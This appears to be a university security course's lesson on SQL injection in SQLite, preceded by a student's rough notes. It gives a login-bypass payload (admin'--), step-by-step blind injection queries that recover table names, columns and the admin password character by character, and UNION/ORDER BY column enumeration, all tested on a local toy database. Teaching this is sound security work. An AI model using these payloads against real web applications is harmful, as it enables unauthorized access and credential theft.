General reminders

- end your injected query with `;` and comment out whatever might follow using `--` (we’re blind to)
- the docker container resets every 4 hrs
    - Advice:

Before automating…

- Use burp suite. Look at the response packets
    - Do you want to use response codes as feedback?
    - Or do you
    

Start big, narrow it down

- Look at the schema from
    - SELECT * from sqlite_schema;
        - figure out:
            - how many tables does this database have?
                - SELECT * from sqlite_schema where type=’table’ > get the count
            - what table are we in?
    - SELECT name FROM pragma_table_info(’Users’)
        - gives us all the columns for the table ‘Users’
- Brute-force
    - the table name
        - normal query AND (comparison that checks if the first letter of the table name is equal to a certain letter)
            - normal query could be: SELECT * from Users where username=’<USER INPUT>’
                - where our injected query is. Contains the subquery we design
            - If the normal query executes > we know the comparison passed
            - If the normal query does not execute > we know the comparison failed
                - Signal is whether the normal query executes
                - The whole point is: as a client, entering the data won’t allow you to see the result of a custom query. You can only chain the original, intended query with a subquery and see if the original query executes. Through a long series of yes or no, you can find out facts!

### Recall - day after lecture

- SQL as database language (structured query language)
    - there are many variants of SQL
        - SQLite 3 was the focus
        - Others: MySQL, PostgresQL,
    - Characteristics: database contains tables
        - vs other types of databases (relational), which lack tables?
- How to attack?
    - Entry point: user input
        - e.g. when the website prompts for user log-in, entering username and password. If the inputs are not sanitized and assumed safe, as a malicious user, we can enter whatever’s prompted PLUS custom queries.
            - Key point: we control the end of the query
                - What if we don’t actually control the end of the query? in other words what if there are more checks happening in the backdrop unbeknownst to us? Ans: we can be clever and insert comment tags such that whatever follows get commented out
            - Intended query (not coded by you; invisible to you) + custom que
- Flavours of attacks
    - Blind
        - You enter a custom query (which returns a boolean) on top of the intended query. You don’t see the direct result from the custom query. Rather, your signal is to gauge whether the intended query executed. If it does, it means your custom query returned true.
            - E.g. if it executes, maybe it redirects you to another page, where the HTTP status code returned to us would be 320. Else, it’s a 400?
        - In essence, you work things out by asking the server a bunch of implied True/False questions using SQL injections
    - Not blind
        - You enter a custom query and the results get returned to you directly.




Databases form the backbone of web, mobile, and desktop applications. They store user info—which might potentially be private or sensitive—and perhaps store user secrets—which are hopefully hashed and [salted](https://en.wikipedia.org/wiki/Salt_(cryptography).). Database leaks in the form of breaches are all too common in modern cybersecurity. It is consequently imperative we stress test database design and queries to ensure the data is secured from nefarious attackers.

Database design and programming is its own complex discipline. Choosing the correct database for an application or service can be the difference between correct and incorrect responses, and can significantly impact query speed. We don't need to be database engineers to attack web applications, but we must be familiar with their structures and how to interact with them.

We'll first take a look at how to interact with a database, how those interactions can be abused, and practice attack strategies against a modern database.

## SQL Database Structure and Queries

Databases are generally split into two categories: relational or non-relational. Relational databases have a _primary key_ that distinguishes each entry from another. Examples are the ubiquitous MySQL and PostgreSQL. Non-relational databases are more flexible and useful for storing blobs of information with different structures. The popular MongoDB is an example of a non-relational database.

> Understanding the differences between these databases is a full course in itself, so we will restrict this lesson to a single relational database: SQLite.

It's useful to create our own local database research environment to improve our understanding of the system and test hypotheses. One option are SQL "fiddles,” which are small online sandboxes to test SQL queries against. These are very quick to spin up without any of the supporting command line tools or front-end wrappers. It's important to note that the fiddles vary based on SQL database type, as syntax can be a bit different between implementations. Let's use [this SQLite fiddle](https://www.db-fiddle.com/f/hdHg58fWRbufH1w8dgjKgu/0) to create our own database and queries.

First, we must input some data. We can create a table using the `CREATE TABLE` command and indicate which columns we want in that table. Next, we can insert rows into the table using the `INSERT INTO` command followed by `VALUES` that match the required columns.

```sql
CREATE TABLE Users (
    username TEXT PRIMARY KEY,
    password TEXT NOT NULL,
    data TEXT
);

INSERT INTO Users (username, password, data) VALUES ('admin', 'admin_password', 'Admin data');
INSERT INTO Users (username, password, data) VALUES ('noob', 'noob_password', 'Noob data');
```

In the second pane we run database queries, such as `SELCECT`ing the `data` column for the `admin` user so long as the provided `admin_password` matches the expected password in the database:

```sql
SELECT data FROM Users WHERE username='admin' AND password='admin_password'
```

We see that this query filters the database to all rows that match the `username` of `admin` with the `admin_password` password. It then `SELECT`s the `data` column for matching rows, outputting a single column with a single row: 

| data       |
| ---------- |
| Admin data |
## SQL Injection

We can interact with a database from a variety of front-end languages, so let's consider an example using a PHP web server. The following code uses a GET request's parameters to log into a website, querying the database to see if the username and password match. The database's query is defined as a string with the GET request parameters injected into it. It's important to note that the input parameters are wrapped in single quotes to treat them as strings themselves, as required by the SQL syntax we saw previously. 

```php
// Create connection
$db = new SQLite3('mysqlitedb.db');

// retrieve login info from GET request
$username = $_GET['username']; // beware, no input validation!
$password = $_GET['password']; // beware, no input validation!
$query = "SELECT data FROM Users WHERE username='$username' AND password='$password'";
$result = $db->query($query);
```

Given normal parameters, this query will work as intended. But, as we saw in binary exploitation, we are interested in undefined behavior. What if we know there is an admin user and we want to leak its data, but do not know its password? We could try doing something like putting a [SQL comment character](https://www.databasestar.com/sql-comments/) in our username to try and bypass the password check. We want the query to be something like:

```sql
SELECT data FROM Users WHERE username='admin'-- everything after this is ignored!
```

But unfortunately the single quotes in the query prevent this; if we try and login with `admin--`, the query is actually:

```sql
SELECT data FROM Users WHERE username='admin--' AND password='$password'
```

This fails because `admin--` is not in the database. However, what if we include a single quote, `'`, at the end of the username and before the comment? This can close the substring so that the query takes the form: 

```sql
SELECT data FROM Users WHERE username='admin'--' AND password='admin_password'
```

Trying this in our fiddle confirms that it is a valid query which returns the data for the `admin` user! This is our first example of SQL injection to bypass query checks. In production, servers should ensure that the input is validated against known malicious characters, as reinforced by this [classic xkcd comic](https://xkcd.com/327/). 

![[exploits_of_a_mom_2x.png]]

There are plenty of resources online with extensive lists of database payloads, such as [this list from PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md). These are useful for orienting our testing and making sure that we don't leave anything out.

## Blind SQLi

What happens when we do not know the  target data, or have a query that returns data that is not useful to us? It's unlikely a login query will return secrets, like a user's password. In this situation we must use more complex queries to leak information, sometimes byte by byte, to enumerate the database and its information. This is a technique called _blind SQLi_, as we'll use feedback from the server—not the output displayed on the page—to leak information. 

For this, let's use the `sqlite` command line tool to create our own database and test our queries. We can quickly install with our operating system's package manager and spin it up with `sqlite3`. The query format is the same as the online fiddle, so we can create the same database locally for our next tests:

```console
$ sqlite3
sqlite> CREATE TABLE Users (
(x1...>     username TEXT PRIMARY KEY,
(x1...>     password TEXT NOT NULL,
(x1...>     data TEXT
(x1...> );
sqlite> INSERT INTO users (username, password, data) VALUES ('admin', 'admin_password', 'Admin data');
sqlite> INSERT INTO users (username, password, data) VALUES ('noob', 'noob_password', 'Noob data');
```

### Blind SQLi Techniques

There are two main strategies for leaking information through blind SQLi: timing-based and error/response code-based. Timing-based attacks use a conditional check that will execute in a noticeably different amount of time based on the result of the check. These queries may leverage `SLEEP` to suspend the query for a number of seconds or execute a computational expensive operation (such as `EXP(1000000)`) to help distinguish the result. Conversely, error or response code-based blind SQLi uses a differentiated response from the server to leak info. This can include the HTTP response codes or the presence of errors. The key is establishing a baseline of server behavior, whether that be a 200 or 302 redirect on a `true` condition, and then force a different behavior with the `false` condition.

> If using Python's `requests` for blind SQLi, it is important to note that the library's default behavior is to follow 302 redirects and return the final response code in `response.response_code` parameter after all the redirects are resolved. This can be a problem if our blind SQLiI depends on a 200 versus 302 response. Use `response.history` to see if the server generated any intermediate responses, including 302 redirects, that `requests` automatically resolved.

For both blind SQLi strategies, we need conditional queries that can differentiate a chosen query as true or false. Some SQL languages have `IF` `THEN` statements. In SQLite we can use the `CASE WHEN` and a valid (true) condition followed by an invalid (false) condition to force a response change. We can use this with some sort of conditional check, such as counting the number of rows in a table:

```
sqlite> SELECT CASE WHEN COUNT(*) > 1 THEN 'more than one row in users' ELSE '1 or 0 row in users' END AS result FROM users;
more than one row in users
```

That's great, but what if we do not control the whole query, like with SQLi? We need some sort of data that we can return from this comparison that distinguishes true from false. There are a handful of ways to do this, such as UNION attacks, which we cover in a bit. Another particularly slick way is using the `AND` operator, which is SQL's logical `&&` we are already familiar with. Using a numeric value in a conditional check passes as `true`, while a string or failing comparison results as `false`. Note how the first query in the snippet below returns the table data with a numerical value in the second half of the query, but the output is suppressed in the second query because the conditional check fails with a string.

```
sqlite> SELECT * from Users where username='admin' AND (SELECT 1);
admin|admin_password|Admin data
sqlite> SELECT * from Users where username='admin' AND (SELECT 'no');
sqlite>
```

We will combine `CASE WHEN` and `AND` with true and false conditions to force the server into revealing whether the condition we checked passed or failed. But first, we need to know what to check. 

### Schema

A blind attack generally means we do not have any understanding of the underlying database structure and contained data. We need to leak these specifics if we have any hope of finding our desired information. For example, the database's secrets might not even be stored in the same table as the one operated on by the current query! We need table metadata, such as the list of table names and the structure of those tables. SQLite stores this sort of information in its [sqlite_schema](https://www.sqlite.org/schematab.html) table. This is a table of tables (though it doesn't contain itself as an entry), which is very helpful as a starting point. Dumping the `tbl_name` column of all `type='table'` entries shows the list of tables in the database.

```
sqlite> SELECT * from sqlite_schema;
table|Users|Users|2|CREATE TABLE Users (
    username TEXT PRIMARY KEY,
    password TEXT NOT NULL,
    data TEXT
)
index|sqlite_autoindex_Users_1|Users|3|
sqlite> SELECT tbl_name from sqlite_schema WHERE type='table';
Users
```

We'll start by targeting this database to get an understanding of the database as a whole before focusing on a specific table, column, and data cell of choice. 

## Practical Example

With blind SQLi it is extremely important to set up tests locally to ensure our queries accomplish their intended goal. If we don't, we could be sending invalid or incorrect queries to the server and interpreting the failures as `false` conditions! Let's set up a local environment and test leaking a ton of different information to enumerate anything we want in the target SQLite database. 

> Each of our queries assumes the database query starts with something out of our control, specifically `SELECT * from <unknown tablename> WHERE username='`. We use the `Users` table for the sake of the demonstration, however it could be any table as it is out of our control. We also assume that the query continues with some `AND password='` clause, but we know from the beginning of this module that we can bypass the second half of the query using comments. The comment character(s) aren't shown below, for the sake of brevity, but in an attack it/they would be required. 

For each goal (enumerating the database's tables, a table's columns, or a column's data) it is useful to quantify the number of entries before moving on. We can do this with the `COUNT(*) > X` conditional and the aforementioned `CASE WHEN` clause to generate true and false conditions based on the check. By incrementing `X`, we will eventually run into a false condition which selects a string `'no'`, which fails the query. This signals that our count is too large by failing to return any data, as shown below:

```
sqlite> SELECT * from Users WHERE username='admin' AND (SELECT CASE WHEN COUNT(*) > 0 THEN 1 ELSE 'no' END AS result FROM sqlite_schema WHERE type='table');
admin|admin_password|Admin data
sqlite> SELECT * from Users WHERE username='admin' AND (SELECT CASE WHEN COUNT(*) > 1 THEN 1 ELSE 'no' END AS result FROM sqlite_schema WHERE type='table');
sqlite>
```

Great, so we have a single table in the database! We can easily get that database name using `SELECT tbl_name FROM sqlite_schema WHERE ='table'`. But what happens if there was more than one table returned? We need to break down our queries into single comparisons, and we cannot compare two results at the same time. The answer is to limit the results using `LIMIT X` where `X` should always be `1` in our case. That will automatically return only the first row so we can use that as our target. But what if we end up wanting the second (or other) row? `LIMIT` can be combined with `OFFSET X` to index into a different row in the returned results. `OFFSET` is `0` by default, but increasing it to `1` returns results starting with the second row.

We'll use `LIMIT 1 OFFSET 0`, for the sake of posterity, and target the first table in the database. But we do not know its name (we likely cannot see the query when attacking a remote server, so we could not ascertain that the `Users` table is what the query references), so we need to dump it in a way that creates a true/false condition. We could guess common names, but this would fail for anything non-standard.

A better strategy is brute forcing the name letter by letter using a substring comparison. We can limit the comparison to a single (unknown) character with the [`SUBSTR` function](https://www.w3resource.com/sqlite/core-functions-substr.php) to isolate the test. `SUBSTR` takes a string as its first argument, so we need to select the table name as the input. Putting together our knowledge of the `sqlite_schema` table and `LIMIT` with `OFFSET`, we can return a subquery containing the database name for the comparison:

```sql
(SELECT tbl_name FROM sqlite_schema WHERE type='table' LIMIT 1 OFFSET 0)
```

If we iterate through the possible alpha-numeric characters and symbols in the comparison, eventually one _should_ pass, at which point we know the first character in the name. This should be done programmatically using a tool like Python's `requests` or Burp's [Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/getting-started) (which is unfortunately a paid feature).

```
sqlite> SELECT SUBSTR((SELECT tbl_name FROM sqlite_schema WHERE type='table' LIMIT 1), 1, 1);
U
sqlite> SELECT * from Users where username='admin' AND (SUBSTR((SELECT tbl_name FROM sqlite_schema WHERE type='table' LIMIT 1 OFFSET 0), 1, 1)='a');
sqlite> SELECT * from Users where username='admin' AND (SUBSTR((SELECT tbl_name FROM sqlite_schema WHERE type='table' LIMIT 1 OFFSET 0), 1, 1)='U');
admin|admin_password|Admin data
```

Once we match the first character, we can either move to the second character on its own or increase the number of characters compared against and iterate through a larger substring. The latter is shown below with a two-character comparison using the leaked `U` as the known first character.

```
sqlite> SELECT * from Users where username='admin' AND (SUBSTR((SELECT tbl_name FROM sqlite_schema WHERE type='table' LIMIT 1), 1, 2)='Ua');
sqlite> SELECT * from Users where username='admin' AND (SUBSTR((SELECT tbl_name FROM sqlite_schema WHERE type='table' LIMIT 1), 1, 2)='Us');
admin|admin_password|Admin data
```

Great! Using this query programmatically yields the table `Users`. Since that is the only table in the database, we can focus our attention there. Unfortunately we are useless without knowing the table's structure, specifically what columns hold what data. We can query table information with [`pragma_table_info`](https://renenyffenegger.ch/notes/development/databases/SQLite/sql/pragma/table_info), which contains metadata on the columns. We care specifically about the `name` field, so let's just `SELECT` that.

```
sqlite> SELECT name FROM pragma_table_info('Users');
username
password
data

sqlite> SELECT name FROM pragma_table_info('Users') LIMIT 1;
username

sqlite> SELECT name FROM pragma_table_info('Users') LIMIT 1 OFFSET 1;
password
```


We can use this subquery just as we did the `sqlite_schema` subquery to do a count of the columns to know what we're working with. Again, we want to `LIMIT` and `OFFSET`:

```
sqlite>  SELECT * from Users where username='admin' AND (SELECT CASE WHEN COUNT(*) > 2 THEN 1 ELSE 'no' END AS result from pragma_table_info('Users'));
admin|admin_password|Admin data

sqlite>  SELECT * from Users where username='admin' AND (SELECT CASE WHEN COUNT(*) > 3 THEN 1 ELSE 'no' END AS result from pragma_table_info('Users'));
sqlite> 
```

This informs us we have three columns, which we can iterate through in the same way as the table name:

```
sqlite> SELECT * from Users where username='admin' AND (SUBSTR((SELECT name FROM pragma_table_info('Users') LIMIT 1 OFFSET 0), 1, 1)='a');
sqlite> SELECT * from Users where username='admin' AND (SUBSTR((SELECT name FROM pragma_table_info('Users') LIMIT 1 OFFSET 0), 1, 1)='u');
admin|admin_password|Admin data
```

For this target, we need to iterate through the `OFFSET` to figure out the column of interest. Changing offset to `1` shows that the column name is `password`, which definitely looks of interest! Before moving on, let's check how many entries we have in the table by `SELECT * from Users` and using the result in our `COUNT` comparison:

```
sqlite> SELECT * from Users where username='admin' AND (SELECT CASE WHEN COUNT(*) > 1 THEN 1 ELSE 'no' END AS result FROM users);
admin|admin_password|Admin data
sqlite> SELECT * from Users where username='admin' AND (SELECT CASE WHEN COUNT(*) > 2 THEN 1 ELSE 'no' END AS result FROM users);
sqlite> 
```

Ok good, we only have two rows. If we had more rows it might be useful to iterate through the users to find one of interest before simply dumping passwords. In this case we might surmise that the target is the `admin` user, so we can add `WHERE username='admin'` to our subquery when performing the string comparisons. This takes the same form as before, using `SELECT password` as the column of interest. 

```
sqlite> SELECT * from Users where username='admin' AND (SUBSTR((SELECT password FROM Users WHERE username='admin' LIMIT 1 OFFSET 0), 1, 1)='a');
admin|admin_password|Admin data
sqlite> SELECT * from Users where username='admin' AND (SUBSTR((SELECT password FROM Users WHERE username='admin' LIMIT 1 OFFSET 0), 1, 2)='aa');
sqlite> SELECT * from Users where username='admin' AND (SUBSTR((SELECT password FROM Users WHERE username='admin' LIMIT 1 OFFSET 0), 1, 2)='ad');
admin|admin_password|Admin data
```

Eventually, our brute force will get to the point where the following query with `admin_password` passes the comparison and no further appended letters succeed. We can conclude this is the password and try it for ourselves!

```
SELECT * from Users where username='admin' AND (SUBSTR((SELECT password FROM Users WHERE username='admin' LIMIT 1 OFFSET 0), 1, 14)='admin_password');
admin|admin_password|Admin data
```

This is another good moment to step back and appreciate what we accomplished. We turned a simple SQLi vulnerability into configurable primitives: conditional checks that can be used to count and find strings. We used those strings to leak the tables in the database, the columns in the tables, and the data in the columns. We could enumerate the entire database with enough time! This is what makes blind SQLi such a powerful attack vector.

## UNION queries

 [`UNION` attacks](https://portswigger.net/web-security/sql-injection/union-attacks) are another powerful way to leak information about and in the database. Let's take a look at how `UNION` queries work. First, we need to create a second table in our database, such as a `secrets` table:

```sql
CREATE TABLE secrets ( id INTEGER PRIMARY KEY, data TEXT );
INSERT INTO secrets (id, data) VALUES (1, 'flag');
```

`UNION` allows us to join queries and append the results of the second to the first. Let's merge the results of two separate queries from two separate tables together:

```
sqlite> SELECT username,password from Users WHERE username='admin' UNION SELECT id, data FROM secrets;
1|flag
admin|admin_password
```

We see that the `UNION` does not care about data type or column name during the merge, it just stacks data on top of one another. But there is one important consideration, the number of columns returned by all united queries must be equal. Trying to merge a single column result with two columns results in an error. In a web query, this usually results in an Internal Sever Error or 500 response code.

```
sqlite> SELECT username from Users WHERE username='admin' UNION SELECT id, data FROM secrets;
Parse error: SELECTs to the left and right of UNION do not have the same number of result columns
```

This advantageous to us, as we can use it to enumerate the number of columns returned by the beginning of a query, such as our `SELECT X from Users WHERE username='` login query:

```
sqlite> SELECT * from Users WHERE username='admin' UNION SELECT data FROM secrets;
Parse error: SELECTs to the left and right of UNION do not have the same number of result columns
sqlite> SELECT * from Users WHERE username='admin' UNION SELECT data,data FROM secrets;
Parse error: SELECTs to the left and right of UNION do not have the same number of result columns
sqlite> SELECT * from Users WHERE username='admin' UNION SELECT data,data,data FROM secrets;
admin|admin_password|Admin data
flag|flag|flag
```

Without knowing the beginning of the query we can still ascertain that it results in three columns. This works if we know a column and a table name to end the query with, which we may not. In this case we can use the generic `NULL` column to find a match:

```
sqlite> SELECT * from Users WHERE username='admin' UNION SELECT NULL,NULL,NULL;
||
admin|admin_password|Admin data
```

>We could also accomplish this with an `ORDER BY` query, which orders the results by column index. Once the query fails we know we have gone one index too far:
> 
>```
sqlite> SELECT * from Users WHERE username='admin' ORDER BY 1;
admin|admin_password|Admin data
sqlite> SELECT * from Users WHERE username='admin' ORDER BY 2;
admin|admin_password|Admin data
sqlite> SELECT * from Users WHERE username='admin' ORDER BY 3;
admin|admin_password|Admin data
sqlite> SELECT * from Users WHERE username='admin' ORDER BY 4;
Parse error: 1st ORDER BY term out of range - should be between 1 and 3
>```

If we know the table and maybe a column, we can select data from that table and move it into the query results, as shown above! If the webpage displays _all_ results in the page HTML then we successfully leaked database information. If it only chooses a certain number of rows, then we must filter the results with filtering clauses such as `LIMIT`, `OFFSET`, and/or `ORDER BY` to get the leaked data into the parsed result.

## Recitation

#### Recitation 11.0

Different databases have different comment operators. What are some common symbols to try when performing a SQL injection attack against an unknown database schema?

#### Recitation 11.1

Practice making requests with Python's `requests` library. `pip3 install requests` and create a short script that makes a GET and POST request to one of the challenges on the challenge server.

_Hint: you'll need to set the `CHALBROKER_USER_ID` cookie to your NetID to access the challenge routes._

#### Recitation 11.2

Practice making a request to one of the SQL challenges on the challenge server using `requests`. Output the response code to check if the request succeeded or failed.

## Next Steps

This has been a crash course in SQL injection in SQLite, and these strategies work on a variety of relational databases. But each language has its own quirks and some have special techniques to account for differences in query options and design. We will also look at exploitation of a new database concept, NoSQL databases, in our next lesson.
